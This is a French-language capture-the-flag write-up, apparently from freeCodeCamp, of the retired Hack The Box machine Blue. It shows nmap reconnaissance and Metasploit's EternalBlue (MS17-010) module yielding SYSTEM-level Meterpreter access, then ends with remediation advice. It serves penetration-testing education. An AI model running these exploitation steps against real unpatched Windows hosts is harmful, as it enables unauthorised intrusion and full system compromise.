---
title: Restez calme et pirater la boîte - Blue
subtitle: ''
author: Sonya Moisset
co_authors: []
series: null
date: '2020-08-18T21:37:01.000Z'
originalURL: https://freecodecamp.org/news/keep-calm-and-hack-the-box-blue
coverImage: https://www.freecodecamp.org/news/content/images/2020/08/2950db3b33ef23f38b5b41f2a00e9da7-1.jpg
tags:
- name: cybersecurity
  slug: cybersecurity
- name: Ethical Hacking
  slug: ethical-hacking
- name: information security
  slug: information-security
- name: '#infosec'
  slug: infosec
seo_title: Restez calme et pirater la boîte - Blue
seo_desc: "Hack The Box (HTB) is an online platform that allows you to test your penetration\
  \ testing skills. \nIt contains several challenges that are constantly updated.\
  \ Some of them simulate real world scenarios and some of them lean more towards\
  \ a CTF style o..."
---

Hack The Box (HTB) est une plateforme en ligne qui vous permet de tester vos compétences en matière de tests d'intrusion. 

Elle contient plusieurs défis qui sont constamment mis à jour. Certains d'entre eux simulent des scénarios réels et d'autres s'orientent plus vers un style de défi CTF.

**Note** : _Seuls les write-ups des machines HTB retirées sont autorisés._

![Image](https://www.freecodecamp.org/news/content/images/2020/07/Screenshot-2020-07-29-at-21.06.35.png)

Blue est l'une des machines les plus simples sur Hack The Box. Mais elle démontre l'impact de l'exploit EternalBlue, qui a été utilisé pour compromettre des entreprises via des attaques de ransomware et de crypto-minage à grande échelle.

Nous allons utiliser les outils suivants pour pirater la boîte sur une [boîte Kali Linux](https://www.kali.org/) :

* nmap
* searchsploit
* metasploit
* meterpreter

Commençons.

Tout d'abord, j'ajoute **Blue** dans le fichier /etc/hosts.

```bash
nano /etc/hosts
```

avec

```bash
10.10.10.40     blue.htb
```

![Image](https://www.freecodecamp.org/news/content/images/2020/08/Screenshot-2020-08-17-at-20.36.17.png)

## **Étape 1 - Reconnaissance**

La première étape avant d'exploiter une machine est de faire un peu de scanning et de reconnaissance.

C'est l'une des parties les plus importantes car elle déterminera ce que vous pouvez essayer d'exploiter ensuite. Il est toujours préférable de passer plus de temps sur cette phase pour obtenir autant d'informations que possible.

### Scan des ports

Je vais utiliser **Nmap** (Network Mapper). Nmap est un utilitaire gratuit et open source pour la découverte de réseau et l'audit de sécurité. 

Il utilise des paquets IP bruts pour déterminer quels hôtes sont disponibles sur le réseau, quels services ces hôtes offrent, quels systèmes d'exploitation ils exécutent, quel type de filtres de paquets/pare-feu sont utilisés, et des dizaines d'autres caractéristiques.

Il existe de nombreuses commandes que vous pouvez utiliser avec cet outil pour scanner le réseau. Si vous souhaitez en savoir plus, vous pouvez consulter la documentation [ici](https://tools.kali.org/information-gathering/nmap).

![Image](https://www.freecodecamp.org/news/content/images/2020/08/Screenshot-2020-08-17-at-20.41.34.png)

J'utilise la commande suivante pour effectuer un scan intensif :

```bash
nmap -A -v blue.htb
```

**-A** : Active la détection du système d'exploitation, la détection de version, le scan de scripts et le traceroute

**-v** : Augmente le niveau de verbosité

**blue**.htb : nom d'hôte pour la boîte Blue

Si vous trouvez les résultats un peu trop écrasants, vous pouvez essayer ceci :

```bash
nmap blue.htb
```

![Image](https://www.freecodecamp.org/news/content/images/2020/08/Screenshot-2020-08-17-at-20.42.15.png)

Nous pouvons voir qu'il y a plusieurs ports ouverts, y compris :

**Port** 445, Microsoft-DS (Directory Services) partage de fichiers SMB

À partir du scan nmap, nous avons quelques informations concernant le nom de l'ordinateur (haris-PC) et la version de SMB (2.02). 

Le [Server Message Block (SMB)](https://en.wikipedia.org/wiki/Server_Message_Block) est un protocole réseau qui permet aux utilisateurs de communiquer avec des ordinateurs et des serveurs distants afin d'utiliser leurs ressources ou de partager, ouvrir et modifier des fichiers.

À partir du nom de cette boîte et du fait qu'il s'agit d'une machine Windows avec le port 445 ouvert, nous pouvons supposer que la machine est vulnérable à EternalBlue. J'utilise un script nmap pour vérifier cette information avec ce qui suit :

```bash
nmap --script vuln -p 445 blue.htb
```

![Image](https://www.freecodecamp.org/news/content/images/2020/08/Screenshot-2020-08-17-at-20.46.01.png)

Nous pouvons voir que la boîte est vulnérable à une vulnérabilité d'exécution de code à distance dans les serveurs Microsoft SMBv1 (ms17-010).

## **Étape 2 - Comprendre ms17-010**

Qu'est-ce que ms17-010 ?

> **EternalBlue** est un exploit de cyberattaque développé par l'Agence de sécurité nationale des États-Unis (NSA). Il a été divulgué par le groupe de pirates Shadow Brokers le 14 avril 2017, un mois après que Microsoft ait publié des correctifs pour la vulnérabilité - Wikipedia

Vous pouvez en lire plus [[ici](https://docs.microsoft.com/en-us/security-updates/securitybulletins/2017/ms17-010)](null). Cette vulnérabilité a été corrigée et est répertoriée dans le bulletin de sécurité de Microsoft sous le nom MS17-010.

EternalBlue permet aux pirates d'exécuter à distance du code arbitraire pour accéder à un réseau. Il exploite une vulnérabilité dans le protocole SMB du système d'exploitation Windows. L'exploit peut compromettre l'ensemble du réseau et les appareils qui y sont connectés. 

![Image](https://www.freecodecamp.org/news/content/images/2020/08/image-94.png)

Les logiciels malveillants qui utilisent EternalBlue peuvent se propager à travers les réseaux. En 2017, [WannaCry](https://en.wikipedia.org/wiki/WannaCry_ransomware_attack) - un crypto-ransomware - a utilisé l'exploit EternalBlue qui s'est propagé à travers le réseau, infectant tous les appareils connectés. 

## **Étape 3 - Exploiter EternalBlue**

J'utilise **Searchsploit** pour vérifier s'il existe un exploit connu. Searchsploit est un outil de recherche en ligne de commande pour [Exploit Database](https://www.exploit-db.com/).

J'utilise la commande suivante :

```bash
searchsploit eternalblue
```

![Image](https://www.freecodecamp.org/news/content/images/2020/08/Screenshot-2020-08-17-at-21.05.04.png)

Je peux obtenir plus de détails sur un exploit avec :

```bash
searchsploit -x 41738.py
```

![Image](https://www.freecodecamp.org/news/content/images/2020/08/Screenshot-2020-08-17-at-21.04.15.png)

Vous pouvez également consulter la **base de données Exploit** pour trouver l'exploit.

![Image](https://www.freecodecamp.org/news/content/images/2020/08/Screenshot-2020-08-17-at-20.55.20.png)
_[https://www.exploit-db.com/exploits/42315](https://www.exploit-db.com/exploits/42315)_

Il y a un module Metasploit disponible.

![Image](https://www.freecodecamp.org/news/content/images/2020/08/Screenshot-2020-08-17-at-20.56.41.png)
_[https://www.rapid7.com/db/modules/exploit/windows/smb/ms17_010_eternalblue](https://www.rapid7.com/db/modules/exploit/windows/smb/ms17_010_eternalblue)_

Nous allons utiliser **Metasploit**, qui est un framework de test de pénétration qui simplifie le piratage. C'est un outil essentiel pour de nombreux attaquants et défenseurs.

![Image](https://www.freecodecamp.org/news/content/images/2019/08/Screenshot-2019-08-02-at-21.14.13.png)
_[https://www.metasploit.com/](https://www.metasploit.com/" style="box-sizing: inherit; margin: 0px; padding: 0px; border: 0px; font-style: inherit; font-variant: inherit; font-weight: inherit; font-stretch: inherit; line-height: inherit; font-family: inherit; font-size: 17.6px; vertical-align: baseline; background-color: transparent; color: var(--gray90); text-decoration: underline; cursor: pointer; word-break: break-word;)_

Je lance le **Metasploit Framework** sur Kali et cherche la commande que je devrais utiliser pour l'exploit.

N'oubliez pas de mettre à jour Metasploit lorsque vous le lancez avec cette commande :

```bash
msfupdate
```

![Image](https://www.freecodecamp.org/news/content/images/2020/08/Screenshot-2020-08-17-at-21.03.30.png)

Vous pouvez également vérifier si la cible est vulnérable à EternalBlue sur Metasploit en utilisant un auxiliaire. Commencez avec cette commande :

```bash
search eternalblue
```

puis dans ce cas

```bash
use 1
```

pour sélectionner

```bash
auxiliary/scanner/smb/smb_ms17_010
```

![Image](https://www.freecodecamp.org/news/content/images/2020/08/Screenshot-2020-08-17-at-21.10.25.png)

Vous pouvez vérifier les options avec

```bash
show options
```

et définir RHOSTS avec

```bash
set RHOSTS blue.htb
```

Puis exécutez l'auxiliaire avec

```bash
run
```

Vous pouvez voir que l'hôte est probablement vulnérable à MS17-010 !

Vérifions maintenant l'exploit avec

```bash
use 2
```

ou la commande

```bash
exploit/windows/smb/ms17_010_eternalblue
```

![Image](https://www.freecodecamp.org/news/content/images/2020/08/Screenshot-2020-08-17-at-21.31.53.png)

Nous devons configurer les options pour RHOSTS 

![Image](https://www.freecodecamp.org/news/content/images/2020/08/Screenshot-2020-08-17-at-21.31.59.png)

et LHOST - le mien était 10.10.14.24. Vous devrez le configurer avec votre propre LHOST. Vous pouvez vérifier le vôtre [ici](https://www.hackthebox.eu/home/htb/access).

![Image](https://www.freecodecamp.org/news/content/images/2020/08/Screenshot-2020-08-17-at-21.30.21.png)

Avant d'exécuter l'exploit, vous pouvez vérifier ici si la machine est vulnérable - cela exécutera l'auxiliaire que nous avons utilisé précédemment avec la commande

```bash
check
```

![Image](https://www.freecodecamp.org/news/content/images/2020/08/Screenshot-2020-08-17-at-21.32.10.png)

J'exécute ensuite l'exploit avec

```bash
run
```

![Image](https://www.freecodecamp.org/news/content/images/2020/08/Screenshot-2020-08-17-at-21.30.40.png)

L'exploit a dû s'exécuter plusieurs fois avant que j'obtienne une session **Meterpreter**.

Voici la définition de Meterpreter de [Offensive Security](https://www.offensive-security.com/metasploit-unleashed/meterpreter-basics/) :

> Meterpreter est une charge utile avancée, extensible dynamiquement, qui utilise des stagers d'injection de DLL _en mémoire_ et est étendue sur le réseau au moment de l'exécution. Il communique via la socket du stager et fournit une API Ruby complète côté client. Il dispose d'un historique des commandes, d'une complétion par tabulation, de canaux, et plus encore.

Vous pouvez en lire plus sur Meterpreter [ici](https://www.offensive-security.com/metasploit-unleashed/about-meterpreter/).

![Image](https://www.freecodecamp.org/news/content/images/2020/08/Screenshot-2020-08-17-at-21.29.46.png)

Commençons par recueillir quelques informations.

**getuid** retourne l'ID utilisateur réel du processus appelant.

![Image](https://www.freecodecamp.org/news/content/images/2020/08/Screenshot-2020-08-17-at-21.28.39.png)

**NT Authority**\**SYSTEM** ou le compte LocalSystem est un compte Windows intégré. C'est le compte le plus puissant sur une instance locale Windows. Nous avons un accès administrateur sur cette machine.

## **Étape 4 - Recherche du flag user.txt**

Je navigue vers le dossier **haris** depuis **Documents and Settings**.

Je peux lister tous les fichiers/dossiers avec la commande suivante :

```bash
ls -la
```

Je me déplace ensuite vers le **Desktop** avec

```bash
cd Desktop
```

![Image](https://www.freecodecamp.org/news/content/images/2020/08/Screenshot-2020-08-17-at-21.27.02.png)

Et je trouve le flag utilisateur ! Je peux vérifier le contenu du fichier avec

```bash
cat user.txt
```

## **Étape 5 - Recherche du flag root.txt**

Trouvons maintenant le flag root. Je navigue jusqu'à **Users** et vérifie dans le dossier **Administrator**/**Desktop**. Je trouve le flag !

![Image](https://www.freecodecamp.org/news/content/images/2020/08/Screenshot-2020-08-17-at-21.26.16.png)

J'utilise la commande suivante pour voir le contenu du fichier :

```bash
cat root.txt
```

Félicitations ! Vous avez trouvé les deux flags.

## Remédiations

* Corrigiez vos appareils avec la mise à jour de sécurité pour Microsoft Windows SMB v1. Vous pouvez consulter le [Bulletin de sécurité Microsoft](https://docs.microsoft.com/en-us/security-updates/securitybulletins/2017/ms17-010) pour voir quels systèmes d'exploitation sont affectés
* Désactivez SMB v1 et utilisez SMB v2 ou v3
* Appliquez le [principe du moindre privilège](https://en.wikipedia.org/wiki/Principle_of_least_privilege) à tous vos systèmes et services

N'hésitez pas à commenter, poser des questions ou partager avec vos amis :)

Vous pouvez voir plus d'articles de la série **Restez calme et pirater la boîte** [[ici](https://www.freecodecamp.org/news/search/?query=keep%20calm%20and%20hack%20the%20box)](null).

Vous pouvez me suivre sur [Twitter](https://twitter.com/SonyaMoisset) ou sur [LinkedIn](https://www.linkedin.com/in/sonyamoisset/).

Et n'oubliez pas de #**GetSecure**, #**BeSecure** & #**StaySecure** !

![Image](https://www.freecodecamp.org/news/content/images/2020/08/2950db3b33ef23f38b5b41f2a00e9da7.jpg)